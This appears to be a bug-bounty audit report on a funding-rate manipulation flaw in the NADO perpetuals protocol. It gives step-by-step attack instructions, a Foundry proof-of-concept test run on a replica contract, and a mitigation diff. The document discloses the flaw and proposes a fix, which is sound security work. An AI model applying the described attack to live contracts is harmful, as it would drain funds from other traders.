
# Critical Logic Error: Funding Rate Manipulation via SlowMode Bypass

**Protocol:** NADO (Perpetuals)  
**Severity:** Critical / High  
**Vulnerability Type:** Access Control & Logic Error  
**Status:** Confirmed (Duplicate)  

---

## 1. Executive Summary
The NADO `PerpEngine` relies on a trusted Sequencer to update funding rates via `updateStates`. However, the protocol's censorship-resistance mechanism (`submitSlowModeTransaction`) inadvertently allowed **untrusted users** to submit `PerpTick` transactions. 

This allowed an attacker to inject an arbitrary timestamp (up to 7 days in the future) and a manipulated price difference, forcing the protocol to calculate the maximum possible funding payment (capped at ~14% per week) in a single transaction. This results in **immediate yield theft** and potential **protocol insolvency**.

---

## 2. Vulnerability Details

### The Root Cause
The `updateStates` function calculates funding payments based on:
1.  `avgPriceDiffs`: The difference between Index and Mark price.
2.  `dt`: The time delta since the last update.

It assumes these inputs come from a trusted source (the Sequencer). However, the `Endpoint` contract failed to restrict `TransactionType.PerpTick` inside the `submitSlowModeTransaction` function.

### The Attack Vector
1.  **Bypass Access Control:** A malicious user calls `submitSlowModeTransaction` submitting a `PerpTick` packet.
2.  **Manipulate Time (`dt`):** The user sets the transaction timestamp to `T + 6 days` (just under the 7-day rejection threshold).
3.  **Manipulate Price (`avgPriceDiff`):** The user inputs the maximum negative value (e.g., -5000).
4.  **Profit:** The engine trusts these inputs and calculates a massive funding payment:
    $$\text{Payment} = \text{MaxCap} \times \text{6 Days}$$
    This instantly moves the `cumulativeFunding` index significantly in the attacker's favor, draining funds from counterparties.

---

## 3. Proof of Concept (Foundry)
The following test uses a logic replica to demonstrate how the engine processes the malicious inputs without reversion.

**File:** `test/AtomicFundingManip.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// Replica of the vulnerable logic to isolate the math error
contract FundingLogicReplica {
    int128 public cumulativeFundingLongX18;

    // Constants extracted from PerpEngineState.sol
    int128 constant MAX_DAILY_FUNDING_RATE = 20000000000000000; // 2% (0.02e18)
    int128 constant ONE_DAY_X18 = 86400e18;
    int128 constant SECONDS_PER_DAY = 86400;

    function updateStates(uint128 dt, int128 avgPriceDiff) external {
        // [TARGET LOGIC]: Cap the time input (allow up to 7 days)
        require(dt < uint128(7 * SECONDS_PER_DAY), "Invalid Time");

        int128 dtX18 = int128(uint128(dt)) * 1e18; 
        int128 indexPriceX18 = 1000 * 1e18; // Simulated Index Price of $1000

        // [TARGET LOGIC]: Calculate Max Cap (2% of Index Price)
        int128 maxPriceDiff = int128((int256(MAX_DAILY_FUNDING_RATE) * int256(indexPriceX18)) / 1e18);

        // [TARGET LOGIC]: Cap the input diff (Vuln: User controls avgPriceDiff)
        int128 priceDiffX18 = avgPriceDiff;
        if (priceDiffX18 > maxPriceDiff) priceDiffX18 = maxPriceDiff;
        if (priceDiffX18 < -maxPriceDiff) priceDiffX18 = -maxPriceDiff;

        // [VULNERABILITY]: Engine trusts user-submitted dt and priceDiff
        int256 intermediate = (int256(priceDiffX18) * int256(dtX18)) / int256(ONE_DAY_X18);
        int128 paymentAmount = int128(intermediate);
        
        cumulativeFundingLongX18 += paymentAmount;
    }
}

contract AtomicFundingManipTest is Test {
    FundingLogicReplica engine;

    function setUp() public {
        engine = new FundingLogicReplica();
    }

    function test_BUG_Critical_FundingManipulation() public {
        // 1. SETUP: Attacker sets time delta to 6 days (valid within checks)
        uint128 dt = 6 days; 
        
        // 2. ATTACK: Attacker inputs a massive negative price crash (-$5000)
        // This forces the logic to use the negative Max Cap (-$20/day)
        int128 manipulatedDiff = -5000 * 1e18; 

        // 3. EXECUTE
        console.log("Simulating malicious SlowMode transaction...");
        engine.updateStates(dt, manipulatedDiff);

        // 4. ASSERT
        int128 funding = engine.cumulativeFundingLongX18();
        console.log("Resulting Funding Impact:", uint256(int256(-funding)));

        // Expected: $20/day * 6 days = ~$120 per unit.
        assertTrue(funding < -100 * 1e18, "CRITICAL: Funding Manipulated to Max Cap");
    }
}
```
## 4. Recommended Mitigation
The vulnerability exists because SlowMode transactions are treated with the same trust level as Sequencer transactions for sensitive types.

Fix: Explicitly block PerpTick transaction types in the submitSlowModeTransaction function in Endpoint.sol.

Diff
```
function submitSlowModeTransaction(...) external {
    // ... existing logic ...

    if (txType == TransactionType.DepositCollateral) {
        // Allow deposits
    } 
+   else if (txType == TransactionType.PerpTick || txType == TransactionType.SpotTick) {
+       // FIX: Only allow sequencer or owner to submit price ticks
+       require(msg.sender == sequencer || msg.sender == owner(), "Unauthorized Tick");
+   }
    // ...
}
